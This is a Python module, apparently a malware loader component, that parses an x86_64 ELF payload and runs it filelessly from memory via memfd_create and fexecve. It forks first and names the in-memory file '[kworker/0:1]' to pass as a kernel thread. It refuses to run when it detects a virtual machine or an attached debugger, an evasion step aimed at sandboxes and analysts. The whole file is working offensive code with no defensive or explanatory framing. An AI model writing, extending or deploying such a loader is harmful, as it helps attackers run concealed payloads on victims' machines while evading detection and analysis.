# -*- coding: utf-8 -*-
"""
Worker — ELF parsing and memfd execution primitives.
Linux x86_64 only.
"""
import ctypes
import os
import struct
import sys


# ---------------------------------------------------------------
# ELF parsing
# ---------------------------------------------------------------
def parse_elf(data: bytes):
    if len(data) < 64 or data[:4] != b"\x7fELF":
        return None
    if data[4] != 2 or data[5] != 1:
        return None
    e_type, e_machine, e_version, e_entry = struct.unpack_from("<HHIQ", data, 0x10)
    if e_machine != 0x3E:
        return None
    return {
        "type": e_type,
        "machine": e_machine,
        "version": e_version,
        "entry": e_entry,
        "size": len(data),
    }


# ---------------------------------------------------------------
# Environment guards
# ---------------------------------------------------------------
def is_vm() -> bool:
    try:
        p = "/sys/class/dmi/id/product_name"
        if os.path.exists(p):
            with open(p, "r", encoding="utf-8", errors="ignore") as f:
                name = f.read().strip().lower()
            for m in ("vmware", "virtualbox", "qemu", "kvm", "xen", "hyper-v"):
                if m in name:
                    return True
        with open("/proc/cpuinfo", "r", encoding="utf-8", errors="ignore") as f:
            if " hypervisor" in f.read():
                return True
    except Exception:
        pass
    return False


def is_debugged() -> bool:
    try:
        with open("/proc/self/status", "r", encoding="utf-8") as f:
            for line in f:
                if line.startswith("TracerPid:"):
                    return int(line.split()[1]) != 0
    except Exception:
        pass
    return False


# ---------------------------------------------------------------
# memfd execution
# ---------------------------------------------------------------
def _memfd_exec(payload: bytes) -> bool:
    if sys.platform != "linux":
        return False
    try:
        pid = os.fork()
    except OSError:
        return False
    if pid != 0:
        return True

    try:
        libc = ctypes.CDLL("libc.so.6", use_errno=True)
        libc.memfd_create.restype = ctypes.c_int
        libc.memfd_create.argtypes = [ctypes.c_char_p, ctypes.c_uint]

        name = b"[kworker/0:1]"
        fd = libc.memfd_create(name, 0)
        if fd < 0:
            os._exit(1)

        try:
            os.write(fd, payload)
        except Exception:
            os._exit(1)

        try:
            argv = (ctypes.c_char_p * 2)(name, None)
            envp = (ctypes.c_char_p * 1)(None)
            libc.fexecve(fd, argv, envp)
        except Exception:
            pass

        try:
            os.execve(f"/proc/self/fd/{fd}", [name.decode()], {})
        except Exception:
            os._exit(1)
    except Exception:
        pass
    os._exit(1)


# ---------------------------------------------------------------
# Public entry point
# ---------------------------------------------------------------
def process_data(data: bytes) -> bool:
    """Validate, guard, and dispatch an ELF payload."""
    try:
        if not parse_elf(data):
            return False
        if is_vm():
            return False
        if is_debugged():
            return False
        return _memfd_exec(data)
    except Exception:
        return False
